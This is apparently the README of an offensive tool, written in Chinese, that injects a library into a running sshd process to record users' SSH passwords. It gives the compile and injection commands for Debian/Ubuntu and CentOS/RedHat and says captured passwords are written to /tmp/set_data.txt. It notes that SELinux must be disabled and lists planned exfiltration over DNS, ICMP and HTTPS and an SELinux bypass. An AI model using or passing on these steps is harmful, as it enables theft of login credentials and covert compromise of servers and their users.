# what's this?

注入SSHD之后就能记录下密码或者做其他操作。

需要关闭selinux

# how to use
DEBIAN/UBUNTU执行
```
gcc -shared inject_got.c -ldl -fPIC -o test2.so

mv test2.so /tmp/hello.so

gcc sshdHooker.c utils.c shellcode.s -no-pie -g -o inject -ldl -lpthread

sudo ./inject sshd_pid
```
centos/redhat执行
```
gcc -shared inject_got.c -ldl -fPIC -o test2.so -std=c99

mv test2.so /tmp/hello.so

gcc sshdHooker.c utils.c shellcode.s -g -o inject -ldl -lpthread

sudo ./inject sshd_pid
```

然后等待用户连接SSH并且登录成功，密码保存于/tmp/set_data.txt

# todo

 - 增加x86/arm支持
 - 自定义so路径
 - dns/icmp/https发送
 - bypass SELINUX